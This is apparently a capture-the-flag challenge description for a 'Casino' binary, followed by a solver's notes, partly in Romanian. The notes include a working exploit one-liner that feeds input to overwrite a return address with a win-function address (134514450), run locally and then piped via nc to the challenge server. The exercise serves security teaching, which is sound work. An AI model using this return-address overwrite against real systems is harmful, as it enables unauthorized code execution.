# Casino

Hey there, fellow gambler,

Are you good with them numbers? If so, you can try your skills on our new
virtual casino headquartered in Saint Tropez!

You will have plenty of fun and, if you are lucky enough, win boatloads of
bitcoin!

To start, you can train locally using the attached program.

When you are ready to play the real game, the official casino is at the
following address:
`isc2022.1337.cx:10095`.

Let's see if you have what it takes!


### Hints:

  - you don't have the source code :P #ghidra
  - try to use some tools on this one (e.g., python + expect / pwntools);
  - after succeeding locally, make sure to run your exploit on the server!
  - you can use netcat (`nc`) for opening a socket pipe ;)



python3 -c 'print("Florin Salam\n" + "1\n"*41 + "134514450\n" + "x\n" + "n\n")' | ./casino
python3 -c 'print("Florin Salam\n" + "1\n"*41 + "134514450\n" + "x\n" + "n\n")' | nc isc2022.1337.cx 10095

Din Ghidra:
de vzt in conv cu Rusalda
main -> loop -> afiseaza lucky number -> se rescrie adresa de return cu adresa din win care se ref la sub esp, 8 dinainte de fopen de flag
deoarece vrem sa trecem peste verificarea numarului norocos, desi il avem (e mai simplu de facut payloadul) -> address in hex: 08048712 -> address in dec: 134514450
